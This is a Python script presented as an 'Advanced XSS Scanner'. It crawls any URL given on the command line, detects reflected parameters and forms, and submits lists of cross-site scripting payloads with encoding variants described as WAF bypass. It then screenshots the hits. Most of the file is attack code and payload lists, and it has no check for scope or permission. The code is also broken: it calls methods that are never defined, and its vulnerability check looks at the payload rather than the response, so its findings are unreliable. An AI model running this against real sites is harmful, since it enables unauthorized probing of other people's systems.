#!/usr/bin/env python3
"""
Advanced XSS Scanner - Focused on XSS Testing
Author: AI Assistant
Description: A focused XSS scanner that performs targeted reconnaissance and advanced XSS testing
"""

import requests
import json
import time
import random
import string
import base64
import urllib.parse
import os
import sys
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from datetime import datetime
import hashlib

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class XSSReconnaissance:
    """XSS-focused reconnaissance module for finding XSS testing points"""
    
    def __init__(self, target_url, max_depth=2, max_threads=10):
        self.target_url = target_url
        self.max_depth = max_depth
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.visited_urls = set()
        self.discovered_urls = set()
        self.forms = []
        self.parameters = set()
        self.xss_points = []
        
    def print_banner(self):
        """Print the scanner banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                        ADVANCED XSS SCANNER v2.0                            ║
║                    Deep Reconnaissance & XSS Testing                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
Target: {Colors.YELLOW}{self.target_url}{Colors.END}
Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}
"""
        print(banner)
    
    def find_xss_points(self):
        """Find potential XSS testing points"""
        logger.info(f"{Colors.BLUE}[RECON] Finding XSS testing points...{Colors.END}")
        
        # Start with the main target URL
        self.discovered_urls.add(self.target_url)
        
        # Crawl to find forms and parameters
        self.web_crawling()
        
        # Extract XSS testing points
        for url in self.discovered_urls:
            self.analyze_url_for_xss(url)
    
    def web_crawling(self):
        """Crawl website to find XSS testing points"""
        logger.info(f"{Colors.BLUE}[RECON] Crawling for XSS points...{Colors.END}")
        
        urls_to_visit = [self.target_url]
        depth = 0
        
        while urls_to_visit and depth < self.max_depth:
            current_urls = urls_to_visit.copy()
            urls_to_visit.clear()
            depth += 1
            
            logger.info(f"{Colors.CYAN}[CRAWL] Depth {depth} - {len(current_urls)} URLs{Colors.END}")
            
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = {executor.submit(self.crawl_url, url): url for url in current_urls}
                
                for future in as_completed(futures):
                    url = futures[future]
                    try:
                        new_urls, forms, params = future.result()
                        urls_to_visit.extend(new_urls)
                        self.forms.extend(forms)
                        self.parameters.update(params)
                    except Exception as e:
                        logger.error(f"{Colors.RED}[CRAWL] Error: {str(e)}{Colors.END}")
    
    def crawl_url(self, url):
        """Crawl a single URL and extract information"""
        if url in self.visited_urls:
            return [], [], []
        
        self.visited_urls.add(url)
        new_urls = []
        forms = []
        params = set()
        
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            response.raise_for_status()
            
            # Update final URL after redirects
            final_url = response.url
            self.discovered_urls.add(final_url)
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = self.extract_form_data(form, final_url)
                if form_data:
                    forms.append(form_data)
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = link['href']
                absolute_url = urljoin(final_url, href)
                if self.is_valid_url(absolute_url) and absolute_url not in self.visited_urls:
                    new_urls.append(absolute_url)
            
            # Extract parameters from URL
            parsed_url = urlparse(final_url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                params.update(query_params.keys())
            
            # Extract JavaScript files
            for script in soup.find_all('script', src=True):
                script_url = urljoin(final_url, script['src'])
                if self.is_valid_url(script_url):
                    new_urls.append(script_url)
            
            # Technology detection
            self.detect_technologies(response, soup)
            
            # Look for sensitive files
            self.find_sensitive_files(final_url, soup)
            
        except Exception as e:
            logger.error(f"{Colors.RED}[CRAWL] Error processing {url}: {str(e)}{Colors.END}")
        
        return new_urls, forms, params
    
    def extract_form_data(self, form, base_url):
        """Extract form data and parameters"""
        form_data = {
            'action': form.get('action', ''),
            'method': form.get('method', 'GET').upper(),
            'inputs': [],
            'url': base_url
        }
        
        # Make action URL absolute
        if form_data['action']:
            form_data['action'] = urljoin(base_url, form_data['action'])
        else:
            form_data['action'] = base_url
        
        # Extract input fields
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', ''),
                'required': input_tag.has_attr('required')
            }
            
            if input_data['name']:
                form_data['inputs'].append(input_data)
        
        return form_data if form_data['inputs'] else None
    
    def analyze_url_for_xss(self, url):
        """Analyze URL for potential XSS points"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Check for reflected parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                for param in query_params.keys():
                    # Test if parameter is reflected
                    test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
                    test_url = url.replace(param + "=" + query_params[param][0], param + "=" + test_value)
                    
                    try:
                        test_response = self.session.get(test_url, timeout=5)
                        if test_value in test_response.text:
                            self.xss_points.append({
                                'url': url,
                                'parameter': param,
                                'method': 'GET',
                                'context': self.detect_context_from_response(test_response, test_value)
                            })
                            logger.info(f"{Colors.GREEN}[XSS_POINT] Found: {url}?{param}={Colors.END}")
                    except:
                        pass
        except:
            pass
    
    def detect_context_from_response(self, response, test_value):
        """Detect context where test value is reflected"""
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Check HTML context
        if test_value in response.text:
            for tag in soup.find_all():
                if test_value in str(tag):
                    # Check if it's in an attribute
                    for attr_name, attr_value in tag.attrs.items():
                        if test_value in str(attr_value):
                            return 'attribute'
                    return 'html'
        
        # Check JavaScript context
        for script in soup.find_all('script'):
            if test_value in script.string:
                return 'javascript'
        
        # Check CSS context
        for style in soup.find_all('style'):
            if test_value in style.string:
                return 'css'
        
        return 'html'  # Default
    
    def is_valid_url(self, url):
        """Check if URL is valid and within scope"""
        try:
            parsed = urlparse(url)
            target_domain = urlparse(self.target_url).netloc
            
            # Check if URL is within target domain
            if parsed.netloc and target_domain not in parsed.netloc:
                return False
            
            # Skip non-HTTP protocols
            if parsed.scheme not in ['http', 'https']:
                return False
            
            # Skip common file extensions
            skip_extensions = ['.pdf', '.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico']
            if any(url.lower().endswith(ext) for ext in skip_extensions):
                return False
            
            return True
        except:
            return False
    
    def generate_report(self):
        """Generate XSS reconnaissance report"""
        report = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'discovered_urls': list(self.discovered_urls),
            'forms': self.forms,
            'parameters': list(self.parameters),
            'xss_points': self.xss_points,
            'total_urls': len(self.discovered_urls),
            'total_forms': len(self.forms),
            'total_parameters': len(self.parameters),
            'total_xss_points': len(self.xss_points)
        }
        
        # Save report to file
        with open('xss_recon_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        print(f"\n{Colors.GREEN}{Colors.BOLD}=== XSS RECONNAISSANCE SUMMARY ==={Colors.END}")
        print(f"{Colors.CYAN}Target: {self.target_url}{Colors.END}")
        print(f"{Colors.CYAN}URLs discovered: {len(self.discovered_urls)}{Colors.END}")
        print(f"{Colors.CYAN}Forms found: {len(self.forms)}{Colors.END}")
        print(f"{Colors.CYAN}Parameters found: {len(self.parameters)}{Colors.END}")
        print(f"{Colors.CYAN}XSS testing points: {len(self.xss_points)}{Colors.END}")
        print(f"{Colors.GREEN}Report saved to: xss_recon_report.json{Colors.END}\n")
        
        return report

class AdvancedXSSScanner:
    """Advanced XSS scanner with context detection and WAF bypass"""
    
    def __init__(self, recon_data):
        self.recon_data = recon_data
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.driver = None
        self.setup_selenium()
        
    def setup_selenium(self):
        """Setup Selenium WebDriver for screenshot capture"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized successfully{Colors.END}")
        except Exception as e:
            logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver: {str(e)}{Colors.END}")
            self.driver = None
    
    def generate_payloads_for_context(self, context):
        """Generate XSS payloads specific to the detected context"""
        payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<object data="javascript:alert(\'XSS\')">',
                '<embed src="javascript:alert(\'XSS\')">',
                '<form><button formaction="javascript:alert(\'XSS\')">',
                '<details open ontoggle="alert(\'XSS\')">',
                '<marquee onstart="alert(\'XSS\')">',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
                '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
                '<embed src="data:text/html,<script>alert(\'XSS\')</script>">'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '" onload="alert(\'XSS\')"',
                '" onerror="alert(\'XSS\')"',
                '" onclick="alert(\'XSS\')"',
                '" onblur="alert(\'XSS\')"',
                '" onchange="alert(\'XSS\')"',
                '" onsubmit="alert(\'XSS\')"',
                '" onreset="alert(\'XSS\')"',
                '" onselect="alert(\'XSS\')"',
                '" onkeydown="alert(\'XSS\')"',
                '" onkeyup="alert(\'XSS\')"',
                '" onkeypress="alert(\'XSS\')"',
                '" onmousedown="alert(\'XSS\')"',
                '" onmouseup="alert(\'XSS\')"',
                '" onmousemove="alert(\'XSS\')"',
                '" onmouseout="alert(\'XSS\')"',
                '" onmouseenter="alert(\'XSS\')"',
                '" onmouseleave="alert(\'XSS\')"',
                '" ondblclick="alert(\'XSS\')"'
            ],
            'javascript': [
                ';alert("XSS");',
                '";alert("XSS");//',
                "';alert('XSS');//",
                '`;alert("XSS");//',
                '\\";alert("XSS");//',
                "\\';alert('XSS');//",
                '\\`;alert("XSS");//',
                '}alert("XSS");{',
                ']alert("XSS");[',
                ')alert("XSS");(',
                '=alert("XSS");',
                '+alert("XSS");',
                '-alert("XSS");',
                '*alert("XSS");',
                '/alert("XSS");',
                '%alert("XSS");',
                '&alert("XSS");',
                '|alert("XSS");',
                '^alert("XSS");',
                '~alert("XSS");'
            ],
            'css': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                'url("data:text/html,<script>alert(\'XSS\')</script>")',
                'url("vbscript:alert(\'XSS\')")',
                'url("onload=alert(\'XSS\')")',
                'url("onerror=alert(\'XSS\')")',
                'url("onclick=alert(\'XSS\')")',
                'url("onmouseover=alert(\'XSS\')")',
                'url("onfocus=alert(\'XSS\')")',
                'url("onblur=alert(\'XSS\')")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")',
                'data:text/html,<img src=x onerror=alert("XSS")>',
                'data:text/html,<svg onload=alert("XSS")>',
                'data:text/html,<iframe src="javascript:alert(\'XSS\')">',
                'data:text/html,<object data="javascript:alert(\'XSS\')">',
                'data:text/html,<embed src="javascript:alert(\'XSS\')">',
                'data:text/html,<form><button formaction="javascript:alert(\'XSS\')">',
                'data:text/html,<details open ontoggle="alert(\'XSS\')">'
            ]
        }
        
        # Get base payloads for the context
        base_payloads = payloads.get(context, payloads['html'])
        
        # Add encoded variations
        encoded_payloads = []
        for payload in base_payloads:
            # URL encoding
            encoded_payloads.append(urllib.parse.quote(payload))
            # HTML entity encoding
            encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'))
            # Base64 encoding
            try:
                encoded_payloads.append(base64.b64encode(payload.encode()).decode())
            except:
                pass
            # Unicode encoding
            unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in payload)
            encoded_payloads.append(unicode_payload)
        
        # Combine base and encoded payloads
        all_payloads = base_payloads + encoded_payloads
        
        return all_payloads
    
    def detect_form_context(self, url, parameter):
        """Detect context for form parameters"""
        try:
            # Send a test request to detect context
            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
            test_data = {parameter: test_value}
            
            response = self.session.post(url, data=test_data, timeout=10)
            
            # Check where the test value is reflected
            if test_value in response.text:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Check HTML context
                for tag in soup.find_all():
                    if test_value in str(tag):
                        # Check if it's in an attribute
                        for attr_name, attr_value in tag.attrs.items():
                            if test_value in str(attr_value):
                                return 'attribute'
                        return 'html'
                
                # Check JavaScript context
                for script in soup.find_all('script'):
                    if test_value in script.string:
                        return 'javascript'
                
                # Check CSS context
                for style in soup.find_all('style'):
                    if test_value in style.string:
                        return 'css'
            
            return 'html'  # Default
        except:
            return 'html'  # Default
    
    def detect_url_context(self, url, parameter):
        """Detect context for URL parameters"""
        try:
            # Send a test request to detect context
            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
            test_url = url.replace(parameter + "=" + parse_qs(urlparse(url).query)[parameter][0], parameter + "=" + test_value)
            
            response = self.session.get(test_url, timeout=10)
            
            # Check where the test value is reflected
            if test_value in response.text:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Check HTML context
                for tag in soup.find_all():
                    if test_value in str(tag):
                        # Check if it's in an attribute
                        for attr_name, attr_value in tag.attrs.items():
                            if test_value in str(attr_value):
                                return 'attribute'
                        return 'html'
                
                # Check JavaScript context
                for script in soup.find_all('script'):
                    if test_value in script.string:
                        return 'javascript'
                
                # Check CSS context
                for style in soup.find_all('style'):
                    if test_value in style.string:
                        return 'css'
            
            return 'html'  # Default
        except:
            return 'html'  # Default
    
    def detect_context(self, url, parameter, response):
        """Detect the context where user input is reflected"""
        contexts = []
        
        # Parse the response
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Check HTML context
        if parameter in response.text:
            # Find where the parameter appears
            for tag in soup.find_all():
                if parameter in str(tag):
                    # Check if it's in an attribute
                    for attr_name, attr_value in tag.attrs.items():
                        if parameter in str(attr_value):
                            contexts.append('attribute')
                            break
                    else:
                        # It's in HTML content
                        contexts.append('html')
        
        # Check JavaScript context
        script_tags = soup.find_all('script')
        for script in script_tags:
            if parameter in script.string:
                contexts.append('javascript')
        
        # Check CSS context
        style_tags = soup.find_all('style')
        for style in style_tags:
            if parameter in style.string:
                contexts.append('css')
        
        # Check URL context
        if parameter in url:
            contexts.append('url')
        
        return contexts if contexts else ['html']  # Default to HTML context
    
    def test_xss(self, url, parameter, payload, context):
        """Test XSS vulnerability with specific payload and context"""
        try:
            # Prepare the test data
            test_data = {parameter: payload}
            
            # Determine if it's GET or POST
            if '?' in url:
                # GET request
                response = self.session.get(url, params=test_data, timeout=10)
            else:
                # POST request
                response = self.session.post(url, data=test_data, timeout=10)
            
            # Check if payload is reflected
            if payload in response.text:
                # Check if it's executable (basic check)
                if self.is_payload_executable(response.text, payload, context):
                    return True, response
            
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Error testing {url} with {parameter}: {str(e)}{Colors.END}")
        
        return False, None
    
    def is_payload_executable(self, response_text, payload, context):
        """Check if the payload is executable in the response"""
        # This is a simplified check - in a real scenario, you'd need more sophisticated detection
        if context == 'html':
            return '<script>' in payload and '</script>' in payload
        elif context == 'attribute':
            return 'on' in payload and '=' in payload
        elif context == 'javascript':
            return 'alert(' in payload
        elif context == 'css':
            return 'expression(' in payload or 'url(' in payload
        elif context == 'url':
            return 'javascript:' in payload or 'data:' in payload
        
        return False
    
    def capture_screenshot(self, url, payload, parameter):
        """Capture screenshot of the XSS vulnerability"""
        if not self.driver:
            logger.warning(f"{Colors.YELLOW}[SCREENSHOT] WebDriver not available{Colors.END}")
            return None
        
        try:
            self.driver.get(url)
            
            # Wait for page to load
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"xss_poc_{timestamp}_{hashlib.md5(url.encode()).hexdigest()[:8]}.png"
            
            # Take screenshot
            self.driver.save_screenshot(filename)
            
            logger.info(f"{Colors.GREEN}[SCREENSHOT] Saved: {filename}{Colors.END}")
            return filename
            
        except Exception as e:
            logger.error(f"{Colors.RED}[SCREENSHOT] Error capturing screenshot: {str(e)}{Colors.END}")
            return None
    
    def scan_forms(self):
        """Scan forms for XSS vulnerabilities"""
        logger.info(f"{Colors.BLUE}[XSS] Scanning {len(self.recon_data['forms'])} forms...{Colors.END}")
        
        for form in self.recon_data['forms']:
            logger.info(f"{Colors.CYAN}[FORM] Testing form: {form['action']}{Colors.END}")
            
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'textarea', 'search', 'email', 'url']:
                    parameter = input_field['name']
                    
                    # Detect context first
                    context = self.detect_form_context(form['action'], parameter)
                    
                    # Get payloads specific to this context
                    payloads = self.generate_payloads_for_context(context)
                    
                    # Test payloads for this specific context
                    for payload in payloads[:20]:  # Limit to first 20 payloads
                        is_vulnerable, response = self.test_xss(
                            form['action'], parameter, payload, context
                        )
                        
                        if is_vulnerable:
                            vulnerability = {
                                'type': 'XSS',
                                'url': form['action'],
                                'parameter': parameter,
                                'payload': payload,
                                'context': context,
                                'method': form['method'],
                                'severity': 'High',
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            # Capture screenshot
                            screenshot = self.capture_screenshot(form['action'], payload, parameter)
                            if screenshot:
                                vulnerability['screenshot'] = screenshot
                            
                            self.vulnerabilities.append(vulnerability)
                            
                            logger.info(f"{Colors.GREEN}[VULN] XSS found in {form['action']} parameter: {parameter}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
                            
                            # Break after first successful payload
                            break
                    
                    if is_vulnerable:
                        break
    
    def scan_urls(self):
        """Scan URLs for XSS vulnerabilities"""
        logger.info(f"{Colors.BLUE}[XSS] Scanning {len(self.recon_data['discovered_urls'])} URLs...{Colors.END}")
        
        for url in self.recon_data['discovered_urls']:
            if '?' in url:
                # URL has parameters
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                for parameter in query_params.keys():
                    logger.info(f"{Colors.CYAN}[URL] Testing {url} parameter: {parameter}{Colors.END}")
                    
                    # Detect context first
                    context = self.detect_url_context(url, parameter)
                    
                    # Get payloads specific to this context
                    payloads = self.generate_payloads_for_context(context)
                    
                    # Test payloads for this specific context
                    for payload in payloads[:15]:  # Limit to first 15 payloads
                        is_vulnerable, response = self.test_xss(url, parameter, payload, context)
                        
                        if is_vulnerable:
                            vulnerability = {
                                'type': 'XSS',
                                'url': url,
                                'parameter': parameter,
                                'payload': payload,
                                'context': context,
                                'method': 'GET',
                                'severity': 'High',
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            # Capture screenshot
                            screenshot = self.capture_screenshot(url, payload, parameter)
                            if screenshot:
                                vulnerability['screenshot'] = screenshot
                            
                            self.vulnerabilities.append(vulnerability)
                            
                            logger.info(f"{Colors.GREEN}[VULN] XSS found in {url} parameter: {parameter}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
                            
                            # Break after first successful payload
                            break
                    
                    if is_vulnerable:
                        break
    
    def generate_xss_report(self):
        """Generate XSS vulnerability report"""
        report = {
            'scan_info': {
                'target': self.recon_data['target'],
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        # Save report to file
        with open('xss_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        print(f"\n{Colors.GREEN}{Colors.BOLD}=== XSS SCAN SUMMARY ==={Colors.END}")
        print(f"{Colors.CYAN}Target: {self.recon_data['target']}{Colors.END}")
        print(f"{Colors.CYAN}Vulnerabilities found: {len(self.vulnerabilities)}{Colors.END}")
        
        if self.vulnerabilities:
            print(f"\n{Colors.RED}{Colors.BOLD}VULNERABILITIES:{Colors.END}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Colors.YELLOW}{i}. {vuln['type']} in {vuln['url']}{Colors.END}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Context: {vuln['context']}")
                print(f"   Payload: {vuln['payload']}")
                if 'screenshot' in vuln:
                    print(f"   Screenshot: {vuln['screenshot']}")
                print()
        
        print(f"{Colors.GREEN}Report saved to: xss_report.json{Colors.END}\n")
        
        return report
    
    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            self.driver.quit()

def main():
    """Main function"""
    if len(sys.argv) != 2:
        print(f"{Colors.RED}Usage: python3 {sys.argv[0]} <target_url>{Colors.END}")
        print(f"{Colors.YELLOW}Example: python3 {sys.argv[0]} https://example.com{Colors.END}")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Phase 1: XSS Reconnaissance
    print(f"{Colors.BLUE}{Colors.BOLD}=== PHASE 1: XSS RECONNAISSANCE ==={Colors.END}")
    recon = XSSReconnaissance(target_url)
    recon.print_banner()
    
    try:
        recon.find_xss_points()
        recon_data = recon.generate_report()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO] Reconnaissance interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"{Colors.RED}[ERROR] Reconnaissance failed: {str(e)}{Colors.END}")
        sys.exit(1)
    
    # Phase 2: XSS Scanning
    print(f"\n{Colors.BLUE}{Colors.BOLD}=== PHASE 2: XSS SCANNING ==={Colors.END}")
    scanner = AdvancedXSSScanner(recon_data)
    
    try:
        scanner.scan_forms()
        scanner.scan_urls()
        scanner.generate_xss_report()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO] XSS scanning interrupted by user{Colors.END}")
    except Exception as e:
        logger.error(f"{Colors.RED}[ERROR] XSS scanning failed: {str(e)}{Colors.END}")
    finally:
        scanner.cleanup()

if __name__ == "__main__":
    main()